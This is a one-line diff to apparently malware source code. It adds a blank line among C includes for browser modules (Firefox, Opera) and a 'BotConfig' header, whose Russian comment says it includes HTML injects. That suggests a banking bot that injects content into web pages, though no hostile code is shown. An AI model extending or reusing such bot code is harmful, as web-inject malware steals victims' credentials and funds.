@@ -9,6 +9,7 @@
 #include "Firefox.h"
 #include "Opera.h"
 
+
 #include "KeepAlive.h"
 
 #include "BotConfig.h"     // Модуль включает HTML инжекты
